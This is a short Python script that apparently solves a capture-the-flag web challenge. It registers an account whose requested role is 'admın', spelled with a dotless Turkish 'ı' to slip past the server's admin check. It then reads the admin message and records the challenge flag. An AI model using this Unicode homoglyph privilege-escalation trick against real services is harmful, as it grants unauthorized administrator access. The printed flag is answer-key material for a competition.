import requests
import random

url = "https://escatlate-52bc47e034fa.1753ctf.com/api/"

rnd = str(random.randint(100000, 999999))
print(rnd)

resp = requests.post(url + "register", json={
    "username": rnd,
    "password": rnd,
    "role": "admın"  # <-- 'ı' is not 'i'!
})
print(resp.status_code, resp.text)

token = resp.json()["token"]

resp = requests.get(url + "message", headers={
    "X-Token": token
})
print(resp.text)  # {"message":"Hi Admin! Your flag is 1753c{w3ll_n0w_th4h_w4s_n0t_soooo_obv1ous}"}

# 1753c{w3ll_n0w_th4h_w4s_n0t_soooo_obv1ous}
